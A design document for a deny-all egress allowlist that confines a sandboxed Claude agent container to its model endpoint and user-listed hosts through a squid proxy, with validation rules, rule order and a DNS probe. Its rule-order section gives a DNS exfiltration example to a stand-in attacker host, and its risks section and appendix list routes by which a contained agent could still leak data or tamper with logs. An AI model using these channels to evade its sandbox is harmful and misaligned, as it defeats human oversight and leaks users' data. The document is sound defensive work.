## Context

Issue #167 asks how to add a deny-all egress allowlist on top of `--egress-lock`
(#75, #101). The lock already provides everything an allowlist needs except the
list itself:

- the agent container sits only on a per-session `--internal` network, so a
  client that ignores the proxy env has no route;
- a per-session squid sidecar decides and logs every proxied connection;
- the access log and a `.meta` file are saved on the host at session end, and
  the denied hosts are printed;
- startup and teardown are fail-closed.

What it doesn't do is restrict non-model traffic. The squid config ends in
`http_access allow all` (`gen_egress_squid_conf` in `run.sh`), and the
egress-lock change lists "a host or repo allowlist, in any form" as a non-goal.

The teams that use the lock mostly have a hard requirement: all traffic goes
to the LLM proxy and to known on-prem hosts. This change delivers that core
and nothing more. Conveniences found during analysis and review are listed as
follow-ups (D9), each a small change of its own.

Prior work this design reuses or answers:

- **#100** (`refs/pull/100/head`, `2bfc71f`): `--egress-allowlist` with a
  built-in base set, hosts implied by credential flags, and a per-repo file
  approved by SHA-256. Closed in favour of #101.
- **The first #101 draft** (`api-egress-policy`, removed in `600d509`): a
  host-side policy file with nothing implied, and a name-only deny before
  every `dst` ACL so squid never resolves an unlisted name.
- **Egress-lock design D3**, which rejected a deny-all policy file because
  every colleague would hit blocked hosts. That holds for a default; this is
  a second opt-in for the teams that need it.

Constraints carried over: no new capabilities in the agent container
(`CapBnd` stays `0xc5`), bash 3.2 on macOS, and the env var that points at a
host-side file (`CLAUDE_DOCKER_GH_POLICY`, `CLAUDE_DOCKER_API_CA`) is the
established knob.

The first draft was reviewed by a security engineer, an architect and an
acceptance reviewer; their findings that apply to this scope are folded in.

## Goals / Non-Goals

**Goals:**

- Under `--egress-allowlist`, a session can reach only the model endpoint and
  the hosts the user listed, by any client. Nothing is implied.
- No source the agent can write to during the session can widen the list.
- Unlisted names aren't resolved, by squid or by the engine's DNS.
- The saved evidence shows exactly which rules ran.
- `--egress-lock`, `--api` and sessions without the new flag are unchanged,
  down to the generated squid config and the `.meta` keys.

**Non-Goals:**

- The follow-ups in D9.
- A per-repository list, subscription sessions, TLS interception, per-path
  rules, non-HTTP protocols.
- Closing exfiltration through an allowed host (see Risks).

## Decisions

### D1. A separate flag that requires `--egress-lock` (option B)

`--egress-allowlist[=FILE]` turns on deny-all. Without `--egress-lock` it is a
startup error, the same way `--egress-lock` without `--api` is. It doesn't
imply the lock: the mode stays visible on the command line.

| Option | Verdict |
| --- | --- |
| **A.** Extend `--egress-lock`: it reads a list when one is configured and switches to `deny all` | Rejected. A file appearing on disk would change what an existing command line does. `--egress-lock` is documented and in use as "pin model traffic, everything else open". |
| **B.** A separate flag that requires `--egress-lock` | **Chosen.** `--egress-lock` keeps its meaning; the endpoint pin, managed settings, internal network, log and teardown stay the base layer. |
| **C.** A separate flag that works without `--egress-lock`, for subscription users | Rejected for now. Subscription sessions need provider hosts the lock refuses by design. |

### D2. Sources

The effective list is the union of:

1. **Base:** the `ANTHROPIC_BASE_URL` endpoint on its port, and under `--api`
   the auth-proxy sidecar's model-proxy name (`claude-docker-api-proxy:8080`),
   which forwards only to that endpoint.
2. **At most one allowlist file:** `FILE` from `--egress-allowlist=FILE`,
   else the path in `CLAUDE_DOCKER_EGRESS_ALLOWLIST`. A path that isn't a
   readable regular file is fatal, like `CLAUDE_DOCKER_GH_POLICY`. No file is
   fine: the list is then the base and the flags.
3. **`--egress-allow=ENTRY`**, repeatable. An empty value is fatal.

`run.sh` expands a leading `~/` in `FILE` and in the env var, because bash
doesn't expand `~` after `=` and `op run --env-file` doesn't either. When
`--egress-allowlist` has no value and a workspace argument is a regular file,
the error suggests `--egress-allowlist=FILE` (the space form otherwise makes
the file a workspace).

`CLAUDE_DOCKER_EGRESS_ALLOWLIST` without `--egress-allowlist` is ignored and
not read, like `CLAUDE_DOCKER_API_CA` without `--api`. `--egress-allow`
without `--egress-allowlist` is a startup error.

There is no fixed fallback path such as
`$XDG_CONFIG_HOME/claude-docker/egress-allowlist`. A file on disk silently
changing a session is option A's problem again, and a session run on `$HOME`
could write it. Setting the env var in a shell profile gives the same
convenience with an explicit opt-in.

### D3. Nothing is implied; sidecar flags need their hosts listed

Credential flags (`--gh`, `--gh-direct`, `--glab`, `--glab-direct`, `--tfe`,
`--az`, `--aws`, `--registry`) add no hosts. Deny-all means the user lists
every host the session may reach. A flag whose hosts aren't listed simply
fails, and the denied summary names the hosts.

`--gh` and `--glab` need one more rule. Their auth-proxy sidecar is on the
agent's internal network, and the agent's `/etc/hosts` maps the hosts it
serves to it. A client that ignores the proxy env reaches the sidecar
directly, and the sidecar forwards to GitHub or GitLab whatever squid's list
says. So under `--egress-allowlist`, `run.sh` refuses to start unless every
host the sidecar serves is covered by an entry:

- `--gh`: `github.com`, `api.github.com`, `uploads.github.com`;
- `--glab`: the proxied GitLab host.

An exact entry or a covering `.suffix` counts, with or without a port. With
the hosts listed, using the flag means the user allowed them, so the direct
path matches the policy. The sidecar's own port rules (a `--glab` host's
port) apply as under the lock. The `--api` sidecar needs no such check: it
only forwards to the endpoint, which is always allowed.

The `-direct` variants and the other flags go through squid like any other
client, so deny-all already applies to them.

### D4. Who may change the list

Every source is on the host side: the command line, the host environment,
and a file read by `run.sh` before any container starts. The agent can't
change any of them during the session.

The file could still sit inside a mounted workspace (for example
`--egress-allowlist=./allow` in the repo), where the agent can edit it for
the next run. `run.sh` resolves the file's directory with `cd -P … && pwd -P`
(bash 3.2-safe, no `realpath`), resolves each workspace the same way, and
refuses to start if the file lies inside any workspace, read-only or not,
comparing on a `/` boundary so `~/repo2/allow` isn't "inside" `~/repo`.
Today's workspace code uses plain `pwd`, which keeps symlinks, so the check
must not reuse it.

A file or env file written by an earlier session that mounted its directory
(a session on `$HOME`, an env file inside a repo) can't be caught this way.
The docs say to keep the allowlist file and env files outside every
workspace; a startup report of added entries is a follow-up (D9).

### D5. Entry format and validation

One grammar for file lines and `--egress-allow` values:

```
# comment                     whole-line comments and blank lines are ignored
pypi.org                      exact host           # trailing comments too
.example.com                  the domain and every subdomain (squid dstdomain)
git.internal.example:8443     host or .suffix with a port
```

A trailing CR is stripped. Hosts are lowercased after validation.

Every entry, all checked before any container resource exists:

- The host uses letters, digits, `-` and `.`, is at most 253 characters,
  has labels of 1-63 characters that don't start or end with `-`, and no
  trailing dot. This is also the config-injection defence: no whitespace,
  quote, newline or leading `-` reaches `squid.conf`.
- A `.suffix` has at least two labels: `.com` is refused.
- `*.example.com` is refused with a hint to write `.example.com`.
- A port is 1-65535.
- An IPv4 address is refused ("not supported yet"): a dotted quad would pass
  the host rule. IP and CIDR entries are a follow-up.
- An entry equal to or under a domain in `EGRESS_MODEL_PROVIDERS`, compared
  after lowercasing, is refused, so the list can't contradict the lock.
- An exact duplicate is dropped. An entry covered by a listed `.suffix` (for
  example `api.example.com` with `.example.com`) is refused, because squid
  drops one of two overlapping `dstdomain` entries with a warning.

An invalid entry is **fatal**, naming the source and, for the file, the line.
That is consistent with `CLAUDE_DOCKER_GH_POLICY` and the endpoint checks; a
skipped entry would only surface later as a confusing block.

The `ANTHROPIC_BASE_URL` check stays as it is, so `--egress-lock` is
unchanged. Appendix A explains why its looser rule on a leading `-` doesn't
leak.

### D6. Rule order

Under `--egress-allowlist`:

```
 1. deny manager
 2. deny egress_metadata_names                                   (name)
 3. deny !egress_allowed_names                                    (name only, NEW)
 4. deny egress_metadata_addrs, egress_linklocal, egress_loopback  (dst)
 5. deny egress_model_providers                                   (moved up)
 6. allow endpoint on its port; auth-proxy names on their ports;
    each listed host:port and .suffix:port                       (NEW pairs)
 7. deny !egress_ports; deny CONNECT !egress_tls_port
 8. allow egress_allowed_names                                    (NEW)
 9. deny all                                                      (was: allow all)
```

Without `--egress-allowlist`, the generated config is byte-identical to
today's.

- `egress_allowed_names` (`dstdomain -n`) holds the endpoint, the `--api`
  sidecar name and every listed host and suffix, with or without a port. A
  `host:port` entry therefore also reaches that host on 80/443. An IPv4
  endpoint matches here as a literal string.
- **Rule 3 is the DNS defence.** A `dst` ACL makes squid resolve the request's
  name, so without rule 3 `CONNECT <secret>.attacker.example:443` would leak
  `<secret>` to the attacker's name server through squid's resolver even
  though rule 9 then refuses it. With no address entries in this version,
  rule 3 is a plain "not listed", so there is no IP-literal exception to get
  wrong. IP-literal requests aren't listed and stop there too.
- **The address denies (4) stay above every allow**, so no entry re-opens
  metadata or loopback, including a listed name that resolves there.
- **The provider deny (5) sits above every allow**, including the per-port
  pairs. Under `--egress-lock` alone it stays where it is today.
- **Ports.** Each `host:port` or `.suffix:port` entry gets its own ACL pair,
  so the port opens for that entry only, as the endpoint and `--glab` port
  rules do today. Everything else stays on 80/443 and `CONNECT` 443.

**Private ranges.** Under the allowlist, a private address is reachable only
through a listed name, because rule 3 refuses the rest. On-prem hosts are
listed by name. There is no separate private-range deny: every source is
host-side and typed by the user.

### D7. DNS must be closed

The egress-lock spec requires that external names don't resolve inside the
agent container, but on Docker < 26 the engine's embedded resolver still
forwards them from an internal network. For the lock that was a documented
gap, because the lock is about model traffic. For the allowlist, a DNS
channel defeats the purpose.

Under `--egress-allowlist`, after the egress network is created and before the
agent container starts, `run.sh` runs a short-lived probe container from the
agent image on the internal network (`--entrypoint getent`, `hosts
example.org`, the agent's user and `--cap-drop`). If the name resolves,
`run.sh` aborts: `--egress-allowlist` needs Docker ≥ 26 or an engine that
doesn't forward external queries from internal networks. The probe tests the
property itself, so it covers Docker, podman and future engines without a
version table. A probe that can't run is also fatal.

### D8. Evidence

Under `--egress-allowlist`, and only then:

- The file is read once into memory. Its SHA-256 is computed over those
  bytes, the same bytes that are parsed.
- `.meta` gains `allowlist_file` (the resolved path, empty when none) and
  `allowlist_sha256` (empty when none).
- The generated `squid.conf` is saved as `<start>-<id>.conf` next to the log.
  It is the rule set squid enforced, including every `--egress-allow` entry,
  so no separate list format is needed.

The existing end-of-session `egress proxy blocked:` summary already names
what to add. `--egress-lock` sessions without the flag keep today's `.meta`
keys and get no `.conf`.

### D9. Follow-ups

Each is a small change on top of this one, taken when teams ask for it:

1. **Presets** (`preset:npm`, `pypi`, `go`, `github`) kept in `run.sh` as
   exact hosts, with a scheduled CI job that fetches through each preset and
   fails on a denied host.
2. **IP and CIDR entries.** They need an anchored IP-literal exception in
   rule 3 (`^([0-9]{1,3}\.){3}[0-9]{1,3}$`; unanchored, `1.2.3.4.<secret>.x`
   would pass and be resolved), a `dst` allow, and width limits (public
   ranges at least `/24`).
3. **Implied hosts** for credential flags, if teams prefer convenience over
   listing everything: exact hosts only, never `.amazonaws.com` or
   `.visualstudio.com`, with userinfo stripped from registry URLs.
4. **A public-suffix guard** refusing `.co.uk`, `.github.io`, `.amazonaws.com`
   and similar multi-tenant suffixes.
5. **A startup report** of entries added since the last allowlist session,
   read from the newest `.meta`, against lists widened by an earlier session.
6. **An allow hint** after the denied summary, naming the file used.
7. **A per-repository file** with host-side hash approval (#100), plus a
   private-range deny for its entries.

## Risks / Trade-offs

What the allowlist still won't stop; `docs/auth.md` and `docs/security.md`
must say this so nobody sells it as a DLP control:

- **Data sent through allowed hosts.** The LLM proxy receives every prompt by
  design. A multi-tenant allowed host (GitHub, a package registry, a shared
  Git server) becomes a channel with a credential the attacker supplies in a
  prompt. Any allowed host whose logs or content the attacker can read is a
  channel.
- **DNS through listed suffixes.** For a listed `.suffix`, squid resolves
  `<anything>.suffix`, so whoever runs that zone's DNS sees the label, and can
  point the name at a private address. Prefer exact hosts; never list a
  suffix whose subdomains others can register.
- **Domain fronting.** squid sees only the `CONNECT` host. Without TLS
  interception it doesn't check SNI or the inner `Host` header.
- **Earlier sessions.** A session that could write the allowlist file or an
  env file widens the next session's list (D4).
- **The `--gh` / `--glab` sidecar** is reachable directly, bypassing squid's
  log, as today. D3 makes sure its hosts are on the list.
- **Friction.** Every host must be listed, including ones tools fetch at
  runtime. The denied summary names them. The default without the flag stays
  open.
- **The spec's Purpose** for `api-egress-policy` still says the proxy "leaves
  other hosts open", and a delta can't change it; it is updated at archive
  time (tasks 5.4).

## Open Questions

1. Whether saving `squid.conf` should extend to plain `--egress-lock`
   sessions.

## Appendix A. squid 7.6 behaviour checked during review

Review raised two possible changes to plain `--egress-lock` sessions. Both
were checked against the squid 7.6 source (`SQUID_7_6`) and the Alpine
3.24 `squid-7.6-r0` build, and both were dropped from this change so that
`--egress-lock` stays unchanged. These are source-reading results, not
runtime tests.

**An `ANTHROPIC_BASE_URL` host starting with `-`.** The endpoint check
(`run.sh:420`) accepts it, and the host is written as
`acl egress_model_endpoint dstdomain -n <host>`. squid parses every leading
`-` token on an ACL line as an option (`src/acl/Options.cc`), and
`dstdomain` supports only `-n` (`src/acl/DestinationDomain.cc`):

- `-gw.example.eu`, `--gw.example.eu` and any other `-x…` host:
  `unsupported ACL option`, a configuration error. squid doesn't start, and
  the lock aborts before the agent container starts.
- exactly `-n` or `--`: read as an option or the end-of-options marker,
  leaving an empty ACL (`WARNING: empty ACL`). squid starts, but the endpoint
  allow never matches, and the host doesn't resolve.

Every case fails closed, and no real gateway has such a name because DNS
hostnames can't start with `-`. `ANTHROPIC_BASE_URL` is set by the user on
the host. A valid but wrong URL (a lookalike domain, the wrong region's
gateway) is the human error that does misdirect model traffic, and no
syntax check can catch it; the `endpoint=` line in `.meta` is where it shows.

**Control characters in the denied-host summary.** The summary prints field 7
of `TCP_DENIED` lines, and squid's native log writes the URL as is
(`src/log/FormatSquidNative.cc`).

- The request-line parser (`src/http/one/RequestParser.cc`) accepts only URI
  characters, whitespace, RFC 2396 "unwise" characters and, with HTTP
  violations (not disabled in Alpine's build), bytes 0x80–0xFF in the
  request target. ESC and other C0 controls make the request a parse error,
  which is not logged as `TCP_DENIED`. Whitespace is stripped from hosts
  (`uri_whitespace strip`, the default).
- `CONNECT` hosts must be HTTP token characters (`src/anyp/Uri.cc`,
  `parseHost`).
- A plain-HTTP host can carry bytes 0x80–0xFF (`check_hostnames` is off by
  default), and a denied one (for example on port 8080) reaches the summary.
  0x9b is CSI only in terminals using 8-bit C1 controls; UTF-8 terminals show
  an invalid byte.

So an agent can at most garble the summary in a UTF-8 terminal, not inject
escape sequences. Reducing printed hosts to `[A-Za-z0-9.:-]` would remove the
residue; that is a separate fix for `--egress-lock`, not part of this change.
